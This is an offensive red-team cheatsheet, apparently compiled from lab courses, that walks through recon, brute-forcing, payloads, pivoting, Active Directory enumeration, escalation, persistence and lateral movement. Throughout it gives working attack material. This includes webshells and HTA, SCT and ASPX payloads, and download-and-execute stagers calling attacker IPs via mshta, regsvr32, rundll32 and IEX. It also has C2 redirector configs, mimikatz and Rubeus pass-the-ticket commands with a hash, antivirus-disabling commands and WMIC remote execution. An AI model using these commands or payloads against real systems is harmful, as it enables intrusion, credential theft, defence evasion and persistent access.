# OffSec RT Cheatsheet   
  
Note: ==mixture of commands from GOAD and SEC565Labs as cheatsheet, need to know when/on what/how to use the commands or you will fail!==  
  
## Reconnaissance and Password Attacks  
### Discovery  
pages and logging function  
```
curl https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-small-words.txt -o directories.txt

```
```
ffuf -mc 200,301 -w directories.txt -u http://www.draconem.io/FUZZ
gobuster

```
### Create wordlist  
```
cewl http://www.draconem.io/ -v -d 1 -m 9 -w words.txt -e --email_file emails.txt
john --wordlist=words.txt --rules --stdout > john-mutations.txt
hashcat --force words.txt -r /opt/hashcat/rules/leetspeak.rule --stdout > hashcat-mutations.txt

```
### Conversions  
```
# create usernames

```
```
# use familynames-usa-top1000.txt
# use femalenames-usa-top1000.txt
# use malenames-usa-top1000.txt
while read first;
  do while read last;
    do echo $first.$last >> usernames.txt;
    done < familynames.txt;
  done < firstnames.txt

```
```

# mixing
tr '[:upper:]' '[:lower:]' < usernames-uniq.txt > /dev/null
tr A-Z a-z < usernames-uniq.txt > /dev/null
sed 's/.*/\L&/g' < usernames-uniq.txt > /dev/null
awk '{print tolower($0)}' < usernames-uniq.txt > /dev/null

# create new list
    time tr '[:upper:]' '[:lower:]' < usernames-uniq.txt > usernames-lower-unique.txt

```
### Brute-force  
```
curl -ski 'http://www.draconem.io/onboarding/' --data-raw "username=seth.duncan&password=test&submit="

#!/bin/bash

```
```
while read p; do
  filename="attempts/$u-$count"
  echo $p > $filename
  curl -ski 'http://www.draconem.io/onboarding/' --data-raw "username=$u&password=$p&submit=" | grep "<h4>" >> $filename
  ((count+=1))
done < hashcat-mutations-1000.txt

```
```

#!/bin/bash
target_url="https://nw10-t189-l400-school.8.netwars.sans.org"
while IFS= read -r cred; do
    echo "Trying $cred..."
    # -s = silent, -o /dev/null = discard output, -w "%{http_code}" = show HTTP status code
    code=$(curl -s -o /dev/null -w "%{http_code}" -U "$cred" "$target_url")
    # Adjust condition based on what status code indicates success (e.g., 200, 301, etc.)
    if [[ "$code" == "200" ]]; then
        echo "Success with: $cred"
        break
    fi
done < credlist

```
### Illegal Unicode  
```
%C0%AF
%E0%80%AF
%F0%80%80%AF
%C0%AE
%C0%2F
%00
%C0%80
%ED%A0%80

```
  
## Initial Access  
```
nmap --script http-vuln-exchange.nse mail.draconem.io
powershell -c "Add-PSSnapIn Microsoft.Exchange.Management.Powershell.SnapIn; Get-Recipient | Format-Table -Auto Alias"

#export mailbox
function Export-Email {
    param (
        $User
    )
    Add-PSSnapIn Microsoft.Exchange.Management.Powershell.SnapIn;
    $OutFile = "\\127.0.0.1\c$\ProgramData\" + $User + ".pst";
    New-MailboxExportRequest -Mailbox $User -FilePath $OutFile;
};


```
```
#invoke_script Interact with your agent, select powershell_management_invoke_script from the Execute Module drop down list
ScriptCmd: Export-Email Mark.Goodwin
ScriptPath: /labs/sec-3/initial-access/export-email.ps1

#read emails
c:\ProgramData\Mark.Goodwin.pst
find /opt/empire/empire/server/downloads/ | grep pst
cp /opt/empire/empire/server/downloads/*/C:/ProgramData/Mark.Goodwin.pst .
readpst -S -o . Mark.Goodwin.pst
ll Mark.Goodwin/Inbox/
strings Mark.Goodwin/Inbox/1

```
  
## Payloads and Stagers  
```
# RDP
xfreerdp /v:127.0.0.1:3389 /u:Administrator /d:"cybersec" /p:'CyberPassword' /cert:ignore /size:1920x1080 /sound /clipboard

# WinDownload
powershell.exe -nop -w hidden -c "iex(irm -useb http://10.130.4.100:8888/WindowsUpdate)"

```
### Shells  
```
#PHP
$command = $_GET['cmd'];
exec(command . " 2>&1", $output, $return_status);

#SCT
<?XML version="1.0"?>
<scriptlet>
<registration
description="Win32COMDebug"
progid="Win32COMDebug"
version="1.00"
classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
 >
 <script language="JScript">
      <![CDATA[
           var r = new ActiveXObject("WScript.Shell").Run('powershell ... trimmed ...');
      ]]>
 </script>
</registration>
<public>
    <method name="Exec"></method>
</public>
</scriptlet>

#xsl
<?xml version="1.0"?><stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/><ms:script implements-prefix="user" language="JScript">
<![CDATA[var r = new ActiveXObject("WScript.Shell").Run("powershell ... trimmed ...");]]

#hta
<html><head><script>var c= 'powershell... trimmed ...
new ActiveXObject('WScript.Shell').Run(c);</script></head>
<body><script>self.close();</script></body></ht>

#aspx

```
```
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e) {
        Process p = new Process();
        p.StartInfo.FileName = "powershell.exe";
        p.StartInfo.Arguments = "-noP -sta -w 1 -enc <YOUR_ENCODED_PAYLOAD_HERE>";
        p.StartInfo.CreateNoWindow = true;
        p.StartInfo.UseShellExecute = false;
        p.Start();
    }
</script>

```
### Win Stagers  
```
#create with C2 agent

powershell.exe -noP -sta -w 1 -enc <base64 code to execute>

rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://10.254.252.3:8000/setup.ps1');")


regsvr32 /s /n /u /i:http://10.254.252.2:8000/config.sct scrobj.dll

mshta.exe http://10.254.252.3:8000/app.hta


```
```
iex "(New-Object System.Net.WebClient).DownloadFile('http://www.contoso.com/library/homepage/images/ms-banner.gif', 'ms-banner.gif')"
tar -xf "C:\path\to\file.zip" -C "C:\path\to\destination"
Expand-Archive -LiteralPath "C:\path\to\file.zip" -DestinationPath "C:\path\to\destination"

```
### Copy-Paste  
```
## encode from binary file to base64txt
powershell -C "& {$outpath = (Join-Path (pwd) 'out_base64.txt'); $inpath = (Join-Path (pwd) 'data.jpg'); [IO.File]::WriteAllText($outpath, ([convert]::ToBase64String(([IO.File]::ReadAllBytes($inpath)))))}"

## decode from base64txt to binary file
powershell -C "& {$outpath = (Join-Path (pwd) 'outdata2.jpg'); $inpath = (Join-Path (pwd) 'out_base64.txt'); [IO.File]::WriteAllBytes($outpath, ([convert]::FromBase64String(([IO.File]::ReadAllText($inpath)))))}"

```
  
## Pivot and Redirect  
```
ssh -p 2222 bastion@pivotclub
ssh -p 2222 bastion@pivotclub -L0.0.0.0:5080:10.199.2.120:80

#proxy listener
ssh -p 2222 bastion@pivotclub -D9000
curl -x socks5h://localhost:9000 http://10.199.2.120
proxychains

ssh tyler@10.212.243.13 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -J bastion@pivotclub:2222

#reverse port for beacon catch
ssh -p 2223 tyler@localhost -R10.112.3.199:58671:127.0.0.1:58671
nc -klvp 58671

#redirector
screen -S socat443
socat TCP4-LISTEN:443,fork TCP4:<C2-IP-Address or Hostname>:443

```
### Nginx  
```
server {
        listen 8080 default_server;
        listen [::]:8080 default_server;

        root /var/www/html;

        index index.html;

        location / {
                try_files $uri $uri/ @c2;
        }

        location @c2 {
                proxy_pass http://10.254.252.2:8080;
                proxy_redirect off;
                proxy_set_header Host $host;
                proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }
}

```
### Apache  
```
a2enmod rewrite headers proxy proxy_http ssl cache
a2dismod -f deflate
a2ensite default-ssl

openssl genrsa -out redirect.key 2048
openssl req -new -key redirect.key -out redirect.csr
openssl x509 -req -days 365 -in redirect.csr -signkey redirect.key -out redirect.pem

/etc/apache2/sites-available/default-ssl.conf
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    SSLProxyCheckPeerExpire off
    SSLCertificateFile      /etc/ssl/certs/redirect.pem
    SSLCertificateKeyFile /etc/ssl/private/redirect.key
    <Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

/var/www/html/.htaccess
########################################
## .htaccess START
RewriteEngine On

## (Optional)
## Scripted Web Delivery
## Uncomment and adjust as needed
#RewriteCond %{REQUEST_URI} ^/css/style1.css?$
#RewriteCond %{HTTP_USER_AGENT} ^$
#RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]

## Default Beacon Staging Support (/1234)
RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} ^/..../?$
RewriteRule ^.*$ "https://10.130.4.100:8443%{REQUEST_URI}" [P,L]

## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
## Only allow GET and POST methods to pass to the C2 server
RewriteCond %{REQUEST_METHOD} ^(GET|POST) [NC]
## Profile URIs
RewriteCond %{REQUEST_URI} ^(/__utm.gif.*|/activity.*|/IE9CompatViewList.xml.*|/ca.*|/visit.js.*|/g.pixel.*|/j.ad.*|/ptj.*|/pixel.*|/push.*|/cm.*|/load.*|/match.*|/submit.php.*|/cx.*|/ga.js.*|/updates.rss.*|/fwlink.*|/pixel.gif.*|/en_US/all.js.*|/dpixel.*|/dot.gif.*)$
## Profile UserAgents
RewriteRule ^.*$ "https://10.130.4.100:8443%{REQUEST_URI}" [P,L]

## Redirect all other traffic here
RewriteRule ^.*$ https://google.com/? [L,R=302]

## .htaccess END
########################################

```
### Iptables  
```
iptables -I INPUT -p tcp -m tcp --dport 443 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination <C2-IP-Address or Hostname>:443
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD ACCEPT

```
### Ssh  
```
/etc/ssh/sshd_config
GatewayPorts yes
AllowTcpForwarding yes

```
  
## Internal Reconnaissance  
```
#nmap scripts

```
```
grep -E "ad|active|domain|ldap|krb" /usr/share/nmap/scripts/script.db

```
```
nmap -p 53 --script dns-srv-enum --script-args "dns-srv-enum.domain='yourdomain.local'" <DNS_IP>

```
```
curl -k ldaps://192.168.56.10
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='sevenkingdoms.local',userdb=usernames.txt 192.168.56.10

```
```
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10

```
```


```
```
# Empire: Conduct Host-Based Discovery with Seatbelt
csharp_ghostpack_seatbelt -group all

#whoami
$env:USERNAME
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name

#Empire: check for privesc
powershell_privesc_powerup_allchecks
powershell_privesc_winpeas
#local enum
powershell_situational_awareness_host_winenum

#local enum WMIC PS

```
```
Antivirus:
PS C: \> Get-CimInstance -Namespace "root\securitycenter2" —C AntivirusProduct
File Search:
PS C: \> Get-CimInstance -ClassName CIM_DataFile -Filter "Drive='C:' AND Name LIKE '%password%'" | Select-Object Name, Readable, Fi Format-List *
Local User Accounts:
PS C: \> Get-CimInstance -ClassName Win32_UserAccount | Selec Domain, Name, SID
Domain Enumeration:
PS C: > Get-CimInstance -ClassName Win32 NTDomain | Select-C DomainControllerAddress, DomainName, Roles

```
```
List all users:
PS C: \> Get-CimInstance -Namespace "root\directory\|dap" -ClassName user | Select-object ds_samaccountname 
Members of a group:
C: \> Get-CimInstance -Namespace "root\directory\1dap" -ClassName _group -Filter "ds_samaccountname= Domain Admins'" | Select-Object member
List all computers:
C: > Get-CimInstance -Namespace "root\directory\1dap" -ClassName _computer | Select-Object ds_samaccountname 
Execute commands:
C: \> Invoke-WmiMethod -Class Win32_Process -Name Create - jumentList "cd.exe /c calc. exe"
Unquoted paths:
wmic service get name, displayname, pathname, startmode |findstr /i "Auto" | findstr /i /v "C: \Windows||" | findstr /i /v """

Reference:
https://attack.mitre.org/techniques/T1574/009/

```
```


References:
  https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4

```
```

#Manual: Memory only
$data=(New-Object System.Net.WebClient).DownloadData('https://github.com/peass-ng/PEASS-ng/releases/download/20260121-aabd17ef/winPEASx64_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()

#JScript
var shell = new ActiveXObject("WScript.Shell");
// The PowerShell logic compressed into a single encoded-ready command
var psCommand = "$data=(New-Object System.Net.WebClient).DownloadData('https://github.com/peass-ng/PEASS-ng/releases/download/20260121-aabd17ef/winPEASx64_ofs.exe');" +
                "$asm=[System.Reflection.Assembly]::Load($data);" +
                "[winPEAS.Program]::Main('')";

// Execute hidden (0) and wait for completion (true)
shell.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command " + psCommand, 0, true);

#OR

```
```
rundll32.exe javascript:"..\mshtml.dll,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<REPLACE BY YOUR TUN 0 ADAPTER IP >:6666/stager.ps1');")

```
```

#OR
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1')
PowerSharpPack -winPEAS

#OR
mshta http://10.8.0.2:6666/totallylegit.hta

#registry query
shell reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
reg query "\\targethost\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy
shell Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy

Invoke-Command -ComputerName targethost -ScriptBlock {
    Get-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy
}

powershell/management/get_registry_key

```
## Escalation  
```
powershell_privesc_sweetpotato
#build stand-alone exe for execution
windows/csharp_exe

#Service Binary
powershell -c "Import-Module ./PowerUp.ps1; Write-ServiceBinary -Name SalesFarce -Path ./Sales.exe -Command '<POWERSHELL_STAGERCODE>'"

#Transfer Binary
base64 Sales.exe > Sales.pem
python3 -m http.server 8000
certutil -urlcache -split -f http://10.254.252.3:8000/Sales.pem c:\SalesFarce\sales.pem
certutil -decode c:\SalesFarce\Sales.pem c:\SalesFarce\Sales.exe

#Credentilas dump (requires SYSTEM on same architecture)
powershell_credentials_mimikatz_logonpasswords

```
## Persistence  
```
#Empire: with details below
powershell_persistence_userland_schtasks
====== ScheduledTasks ======

Non Microsoft scheduled tasks (via WMI)

  Name                              :   Updater
  Principal                         :
      GroupId                       :
      Id                            :   Author
      LogonType                     :   Network
      RunLevel                      :   TASK_RUNLEVEL_LUA
      UserId                        :   Mark.Goodwin
  Author                            :   DRACONEM\Mark.Goodwin
  Description                       :
  Source                            :
  State                             :   Ready
  SDDL                              :
  Enabled                           :   True
  Date                              :   3/19/2022 8:01:39 PM
  AllowDemandStart                  :   True
  DisallowStartIfOnBatteries        :   True
  ExecutionTimeLimit                :   PT72H
  StopIfGoingOnBatteries            :   True
  Actions                           :
      ------------------------------
      Type                          :   MSFT_TaskAction
      Arguments                     :   -NonI -W hidden -c "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))"
      Execute                       :   C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
      ------------------------------
  Triggers                          :
      ------------------------------
      Type                          :   MSFT_TaskIdleTrigger
      Enabled                       :   True
      StartBoundary                 :   2022-03-19T20:01:00
      StopAtDurationEnd             :   False
csharp_sharpsploit.enumeration_getregistrykey
RegPath: HKCU:\Software\Microsoft\Windows\CurrentVersion\debug


powershell_persistence_userland_backdoor_lnk
powershell_persistence_elevated_wmi

```
## AD Enumeration  
```
#User Enumeration
powershell_situational_awareness_network_powerview_get_user
Get-DomainUser

#User without preauth, PowerView.ps1
Get-DomainUser -PreauthNotRequired

#Computer Enumeration
powershell_situational_awareness_network_powerview_get_computer
Get-DomainComputer

#Domain Trust Enumeration
powershell_situational_awareness_network_powerview_get_domain_trust
Get-DomainTrust
powershell_situational_awareness_network_powerview_get_domain_policy
Get-DomainPolicyData

#Password Policy Enumeration
([adsisearcher]'(ObjectClass=msDS-PasswordSettings)').FindAll().getDirectoryEntry() | Select-Object -Property  name,msDS-PSOAppliesTo

#Fine-Grained Password Policy Enumeration #This requires read rights on the Password Setting Container object, which is only granted to domain/enterprise administrators by default

#LAPS Enumeration ms-Mcs-AdmPwd # normal users via ms-Mcs-AdmPwdExpirationTime with PowerView.ps1
Get-DomainComputer -Properties * | Where-Object { $_.'ms-Mcs-admpwdexpirationtime' -ne $null } | select name

$s=[adsisearcher]'(ms-MCS-AdmPwd=*)';$s.FindAll()|%{$p=$_.Properties;New-Object PSObject -Prop @{Computer=$p.name[0];Password=$p.'ms-mcs-admpwd'[0];Expiration=[datetime]::FromFileTime($p.'ms-mcs-admpwdexpirationtime'[0])}}

#gMSA Enumeration
([adsisearcher]'(ObjectClass=msDS-GroupManagedServiceAccount)').FindAll().getDirectoryEntry()

https://raw.githubusercontent.com/cybrd0ne/cybersec-toolsbox/refs/heads/main/offensive/565tools/PowerView.ps1

#DNS Enum
bof_situational_awareness_listdns
#list the zones available in DomainDnsZone
(&(objectClass = DnsZone)(!(DC=*arpa))(!(DC=RootDNSServers)))
([adsisearcher]"objectClass=dnsZone").FindAll() | Select-Object -Property Path
([adsisearcher]"objectClass=dnsZone").FindAll() | ForEach-Object { $_.Properties.name } | Select-Object -Unique
([adsisearcher]'(&(objectClass=DnsZone)(!(DC=RootDNSServers))(!(DC=*arpa)))').FindAll() | % { $_.Properties.name }
shell ([adsisearcher]"(&(objectClass=dnsNode)(!(DC=@))(!(DC=*arpa)))").FindAll() | % { "$($_.Properties.name) -> $($_.Properties.dnsrecord)" }

# one-liner for Empire that decodes A records (IPv4) and attempts to stringify CNAME/Text records from the binary data:
shell ([adsisearcher]"(&(objectClass=dnsNode)(!(dc=@))(!(dc=*arpa)))").FindAll() | % { $n=$_.Properties.name; $_.Properties.dnsrecord | % { $t=[BitConverter]::ToUInt16($_, 2); if($t -eq 1){ "$n : $([IPAddress]$_[-4..-1])" } elseif($t -eq 5){ "$n : $([System.Text.Encoding]::UTF8.GetString($_, 24, ($_.Length - 24)))" } } }

#Get Domain SID
shell ([ADSI]"LDAP://DC=north,DC=sevenkingdoms,DC=local").objectSid | ForEach-Object {(New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value}
wmic useraccount where name='Administrator' get sid
# Remove the last -500 to get domain SID

```
### ADModule  
```

## Using RSAT (Remote Server Administration Tool mmc.exe) for User Enumeration 
Install--> Add-WindowsCapability –online –Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0
Query-->   Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property DisplayName, State

#AD built installing with RSAT or manual import:
Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
Get-AdUser -Filter * | select name
Get-ADUser -SearchBase "OU=IT,DC=Draconem,DC=corp" -Filter *
Get-ADUser -Filter "Description -like '*'" -Properties Description | select name,Description
Get-AdComputer -Filter *
Get-ADTrust -Filter * | select name,Direction
Get-DomainComputer -Properties * | select Dnshostname
Get-ADDefaultDomainPasswordPolicy
Get-ADFineGrainedPasswordPolicy -Filter *
Get-ADComputer -Filter * -Properties * | Where-Object { $_.'ms-Mcs-admpwdexpirationtime' -ne $null } | select name
Get-ADServiceAccount -Filter * -Properties * | select name, PrincipalsAllowedToRetrieveManagedPassword
Get-ADComputer -filter * -Properties * | select name,ipv4address
Get-ADComputer -Properties IPv4Address -Filter * | where IPv4Address -eq 'SOME IP ADDRESS' | select name

```
  
  
  
**Kerberoast**  
  
### ADSI  
```
([adsisearcher]'(memberof=cn=Domain Admins,cn=Users,dc=draconem,dc=corp)').FindAll().GetDirectoryEntry() | Select-Object -Last 1 -Property sAMAccountName

([adsisearcher]'(objectclass=user)').FindAll().GetDirectoryEntry() | Select-Object -Property sAMAccountName

([adsisearcher]'(ObjectCategory=Computer)').FindAll().GetDirectoryEntry() | Select-Object -Property samaccountname

([adsisearcher]'(objectClass=trustedDomain)').FindAll().GetDirectoryEntry() | select name,trustdirection

# find GPO password policy then type content
([adsisearcher]'(objectClass=groupPolicyContainer)').FindAll().GetDirectoryEntry()
type "\\$domain\SYSVOL\$domain\Policies"
type "\\draconem.corp\sysvol\draconem.corp\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

#adsi to make a LDAP connection to the base object and then list the base object properties
$base=[adsi]'LDAP://DC=draconem,DC=corp'
$base | Select-Object -Property lockoutThreshold,minPwdLength
#OR
([adsisearcher]'(ObjectClass=msDS-PasswordSettings)').FindAll().getDirectoryEntry() | Select-Object -Property  name,msDS-PSOAppliesTo

([adsisearcher]"(&(objectCategory=computer)(ms-MCS-admpwdexpirationtime=*))").findAll().GetdirectoryEntry() | select name

([adsisearcher]'(ObjectClass=msDS-GroupManagedServiceAccount)').FindAll().getDirectoryEntry()

```
### ADFind  
[https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx](https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx)  
```
.\AdFind.exe -f objectclass=user sAMAccountName Description
.\AdFind -f "sAMAccountName=Staff" member -list
.\AdFind.exe -f objectclass=trusteddomain name trustdirection
.\AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength
.\AdFind.exe -f ObjectClass=msDS-PasswordSettings
.\AdFind.exe -f "(&(objectclass=computer)(ms-Mcs-admpwdexpirationtime=*))" samaccountname
.\AdFind.exe -sddl -resolvesids -f '(ObjectClass=msDS-GroupManagedServiceAccount)' samaccountname msDS-GroupMSAMembership

```
### ADExplorer  
ADExplorer is a tool that is part of the sysinternals suite. This toolkit is developed by Microsoft to facilitate the life of administrators (and redteamers). Using ADExplorer it is possible to create a snapshot of the environment which can then be parsed offline. This is a very nice reconnaisance tactic as it limits the amount of queries being sent into the live environment. An added benefit of sysinternals tooling is that it gets hosted online and is reachable over SMB. This is rather interesting as this allows you to execute the tool without actually dropping it to disk, of course this will create an outbound SMB connection which is an IOC. ADExplorer has a GUI which allows you to view the environment or load a snapshot.  
```
.\ADExplorer.exe -snapshot "dc01.draconem.corp" "snapshot.dat"

```
```
Once you got the snapshot taken, we can use ADExplorer's GUI to parse the snapshot. Launch ADExplorer from the C:\Tools directory and load the snapshot you created which is located in C:\tools\snapshot.dat

```
### LapsToolkit  
[https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/refs/heads/master/LAPSToolkit.ps1](https://raw.githubusercontent.com/leoloobeek/LAPSToolkit/refs/heads/master/LAPSToolkit.ps1)  
```
#import LAPSToolkit (from within the c:\Tools directory)
. .\LapsToolkit.ps1
#enumerate computers with LAPS enabled
Get-LAPSComputers

#enumerate who is allowed to access LAPS password (no output means default configuration (domain admins only))
Find-AdmPwdExtendedRights

```
### SharpAdidnsdump for DNS enumeration  
[https://github.com/b4rtik/SharpAdidnsdump/tree/master/SharpAdidnsdump](https://github.com/b4rtik/SharpAdidnsdump/tree/master/SharpAdidnsdump)  
```
 .\SharpAdidnsdump.exe <DCIP>

```
## Privilege Hunting  
# **Which local access does my compromised user have?**  
```
#enumerate local Administrators group
net localgroup Administrators

```
```
csharp_sharpsploit.enumeration_getnetlocalgroupmember
bof_situational_awareness_netlocalgrouplistmembers

```
# **Which remote access does my compromised user have?**  
```
#enumerate local Administrators group on remote servers

```
```
net localgroup \\<SERVER> Administrators
Invoke-Command -ComputerName <SERVERNAME> -ScriptBlock { Get-LocalGroupMember -Group "Administrators" }
powershell_situational_awareness_network_powerview_get_localgroup
PowerView.ps1 Find-GPOComputerAdmin -ComputerName hr01

#verify domain admins group
Invoke-Command -ComputerName <SERVERNAME> -ScriptBlock {
    (Get-LocalGroupMember -Group "Administrators").Name -contains "DOMAIN\Domain Admins"
}

([ADSI]'WinNT://winterfell/Administrators,group').Invoke('Members') | ForEach-Object {$_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)}

Get-NetLocalGroupMembeer -ComputerName <COMPUTER> -GroupName Administrators | Select ComputerName,MemberName

GetService -ComputerName <COMPUTER> 

powershell_situational_awareness_network_powerview_get_group

# find accesible shares
powershell_situational_awareness_network_powerview_share_finder

# BloolHound noizy collector
powershell_situational_awareness_network_sharphound

```
# **Who is logged on?**  
[https://web.archive.org/web/20221104081636/https://blog.cptjesus.com/posts/sharphoundtargetting/](https://web.archive.org/web/20221104081636/https://blog.cptjesus.com/posts/sharphoundtargetting/)  
```
# remote session enumeration, three methods
# using the NetWkstaUserEnum API call : Requires admin privileges on remote host.
# using the NetSessionEnum API call : requires admin privileges on remote host or a weak DACL configuration on the LanManServer registry key.
# using remote registry, extracting the SID of HKEY_USERS and translating it back to human readable format (if possible) : requires admin privileges on remote host or a weak DACL on HKEY_USERS registry hive

```
```

csharp_situational_awareness_sharpsploit_getnetloggedonuser (Requires admin privileges on remote host)

# this API call returns all network connections that have been established to this server.
csharp_situational_awareness_sharpsploit_getnetsession (only for Admins or missconfigs query the LanManServer registry key)

# logged on users of the target? translate the SIDs that are present in the HKEY_USER hive.
# remote registry access and is not allowed by default
PowerView.ps1 Get-RegLoggedOn -ComputerName fs01.draconem.corp

```
**# Who is running which processes?**  
```
ps powershell
csharp_situational_awareness_sharpsploit_processlist

Get-WmiObject Win32_Process -computername <COMPUTER> | select ProcessName | Select-Object -First 5


```
```
PS C: > $procs = Get-WmiObject Win32 Process -ComputerName FS01.asgard.corp;
foreach ($proc in $procs) ($proc. commandline + ' - ' Sproc.GetOwner () .User)

C: \Windows\System32\svchost.exe -k termsvcs -s TermService - NETWORK SERVICE
C: \Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p -s NebService
- SYSTEM
C: \Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s
TimeBrokerSvc - LOCAL SERVICE
C: \Windows \system32\svchost.exe -k LocalService -p -s nsi - LOCAL SERVICE

```
```


```
## User Impersonation  
```
#create token when knowing user and password (remote token vs local token)
# LOGON32_LOGON_NEW_CREDENTIALS,perform actions that require remote authentication. 
# LOGON32_LOGON_INTERACTIVE is suitable for local actions.
csharp_credentials_sharpsploit_maketoken
#restore your regular privileges when you are done!
csharp_credentials_sharpsploit_reverttoself

#no credentials! use pass-the-hash or pass-the-token
# PTH
powershell_management_spawnas
powershell_credentials_mimikatz_pth
powershell_credentials_tokens

#PTT  must quote all
csharp_code_execution_assembly with Rubeus.exe
"asktgt /domain:draconem.corp /user:Giulio.Stanion /rc4:A5AA48FD29A3A1F5336703AB9A793115 /ptt"

#verify success
ls \\hr01.draconem.corp\c$
net use \\kingslanding.sevenkingdoms.local\ipc /user:north\eddard.stark
Enter-PSSession -ComputerName RemoteServer
Get-WmiObject -Class Win32_OperatingSystem -ComputerName RemoteServer
sc \\RemoteServer query
Get-WmiObject -ComputerName $CompName -ClassName Win32_ComputerSystem

Import-Module CimCmdlets
(Get-CimInstance -ClassName Win32_ComputerSystem -ComputerName "RemotePCName").UserName
#include RDP users as well
Get-CimInstance -ClassName Win32_Process -ComputerName "RemotePCName" -Filter "Name='explorer.exe'" | Invoke-CimMethod -MethodName GetOwner | Select-Object -ExpandProperty User -Unique

[System.Security.Principal.WindowsIdentity]::GetCurrent()

```
## Lateral Movement  
```
# disable antivirus
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

```
```
#Disable Real-time Protection:
Set-MpPreference -DisableRealtimeMonitoring $true.
#Disable Cloud-based Protection:
Set-MpPreference -MAPSReporting Disabled.
#Disable Automatic Sample Submission:
Set-MpPreference -SubmitSamplesConsent NeverSend.
#Disable Everything at Once:
Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableEmailScanning $true -DisableScriptScanning $true.

#RDP for PtH, enable restricted admin rights

```
```
PS C: \> New-ItemProperty -Path "HKLM: \System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force

```
```


```
```
# RDP without GUI, no admin required
SharpRDP.exe computername=FS01.asgard.corp command-"PowerShell iex (iwr -useb http://10.9.254.6/pwnd) " username-asgard\loki password=Qwerty123

#WinRM, requires admin and remote management users
Enter-PSSession and Invoke-Command
Invoke-Command -ComputerName "RemoteComputerName" -ScriptBlock { whoami }

```
```
powershell_lateral_movement_invoke_psremoting

```
```

#WMIC
If we have administrative privileges on the target machine, we could leverage WMI for lateral movemen as well. This ts typically done using a PowerShell download cradle, but you could get creative and use alternative LOLBAS as well.
C:\> wmic /node: target.domain /user: domain\user /password:password process call create "PowerShell. exe iex (iwr -useb https://example.com/totallynotac2payload.ps1') "

```
```
powershell_lateral_movement_invoke_wmi


```
```

#DCOM prefered, very noisy on Windows
Get-CimINstance Win32_DCOMApplication
#
#We can execute remote commands using the MMC20.APPLICATION COM object (requires admin privileges on the target machine). This also gives you a free UAC bypass. The downside is that this COM object will get blocked by the Windows host-based firewall. #instantiate the COM object on the IP address provided (- target)
$a = [System. Activator]:: CreateInstance ([type] ::GetTypeFromProgID ("MMC20. Ap plication", "10.10.20.151"))
#execute command, starts from windir so if binary is not in the system32 folder you need to specify full path
